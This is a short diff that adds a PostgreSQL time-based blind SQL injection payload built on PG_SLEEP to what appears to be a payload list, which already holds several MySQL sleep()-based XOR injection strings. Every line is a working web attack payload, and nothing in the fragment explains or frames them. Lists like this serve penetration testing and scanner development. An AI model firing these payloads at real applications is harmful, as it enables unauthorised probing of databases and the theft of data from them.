@@ -1,3 +1,4 @@
+'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1
 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
 if(now()=sysdate(),sleep(5),0)
